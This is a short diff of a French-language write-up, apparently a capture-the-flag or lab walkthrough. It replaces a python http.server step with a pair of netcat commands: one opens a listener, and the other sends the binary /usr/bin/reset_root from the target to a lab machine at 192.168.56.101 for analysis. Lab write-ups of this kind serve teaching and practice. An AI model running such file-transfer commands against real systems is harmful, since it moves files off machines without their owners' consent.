@@ -182,5 +182,7 @@ CHECKING IF RESET TRIGGERS PRESENT...
 RESET FAILED, ALL TRIGGERS ARE NOT PRESENT.
 ```
 
-Je me décide donc à le récupérer pour l'analyser en me plaçant dans le répertoire ```/usr/bin``` et en exécutant la commande suivante : ```python3 -m http.server 8000```
+Je me décide donc à le récupérer pour l'analyser en exécutant les commandes suivantes :
+- Sur la machine qui va réceptionner le fichier : ```nc -l -p 1234 > reset_root```
+- Sur la machine qui va envoyer le fichier : ```nc -w 3 192.168.56.101 1234 < /usr/bin/reset_root```
 
